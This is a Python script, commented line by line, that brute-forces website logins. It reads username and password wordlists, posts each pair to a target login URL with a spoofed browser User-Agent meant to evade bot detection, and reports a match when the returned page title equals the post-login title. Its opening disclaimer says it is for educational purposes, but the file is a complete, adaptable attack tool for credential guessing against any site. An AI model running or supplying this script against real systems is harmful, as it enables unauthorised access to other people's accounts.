# This bruteforce script is a template and it was made for educational purposes only, please don't use this against other people without their actual consent 


# We need requests, bs4 and sys modules for this to work

import requests
from bs4 import BeautifulSoup
import sys


# The title of the page when the login is successful goes here, (to get the title search in the website's html for the tag <title> inside the <head> tag)

page_title = ''

# Url of the login page of the website, to get the url go into the login page, send a request and capture the response with chrome's developer tools

url = ''

# User agent so that the site doesn't think that we are a bot (we actually are a bot)

headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36'}

# Create function with the name of brute, it will need to arguments, username and password

def brute(username, password):
    # Creating a dictionary called "data" to store the data thats going to be sent to the website

    data = {'username' : username, 'password' : password}
    
    # Do a requests.post with the data argument and our data dictionary to send a request to the website

    r = requests.post(url, data=data, headers=headers).text

    # Use beautiful soup to get the website's information
    
    soup = BeautifulSoup(r, 'html.parser')

    # If the title of the website is equals to the title thats supposed to appear when the login is successful then print the username and password and exit the script. If it isn't just continue the loop

    if soup.title.text == page_title:
        print('|===========================================================================|')
        print(f"          [+] A match was found with {username} : {password} [+]")
        print('|===========================================================================|')
        print('\n')
        sys.exit()
    else:
        pass

# Creating main function

def main():
    # Asks the user if he knows the username and gives the input variable a default valie of "none"

    user_input = str(input('Type username here if you have one, if not press enter >> ') or 'none')

    # If user_input is "none" (no username was given)
    if user_input == 'none':
        # asks for a list of username and passwords
        users = str(input('Specify a file with users >> '))
        passwords = str(input('Specify a file with passwords >> '))
        print('\n')
        # strips the spaces in the files given and stores all lines in a list
        passwords = [w.strip() for w in open(passwords, 'r').readlines()]
        users = [u.strip() for u in open(users, 'r').readlines()]
        user_index = 0
        pass_index = 0
        stop = 0
        # stop is a variable that i made so it stops when there are no more usernames, otherwice it would continue and give an IndexError
        # While stop is not equals to the lenght of users (users list) then continue the loop
        while stop != len(users):
            # Use brute function to send usernames and passwords with the user and pass index
            brute(users[user_index], passwords[pass_index])
            # prints the current password and username that was sent
            print(f'Tried with >> {users[user_index]} : {passwords[pass_index]} \n')
            # Increases one to the password index for every loop
            pass_index += 1
            # if pass_index is equals to the lenght of passwords then increase one to stop, set the password value to 0 and increase one to user index
            if pass_index == len(passwords):
                stop += 1
                pass_index = 0
                user_index += 1
    else:
        # This else is when the user specified a username
        # asks for a password file
        passwords = str(input('Specify a folder with passwords >> '))
        # it cleans up the password file and store lines in a list
        passwords = [w.strip() for w in open(passwords, 'r').readlines()]
        # for each password in passwords (list of passwords)
        for password in passwords:
            # Use brute function with the username given and with the password (for loop)
            brute(user_input, password)
            # prints the username and password being used
            print(f'Tried with >> {user_input} : {password} \n')
        


# You will need to adapt this scrip in case it doesn't work for a website, remember all websites are different but the goal is to find a wayso that it detects what a successful login is 


# just run main function

main()

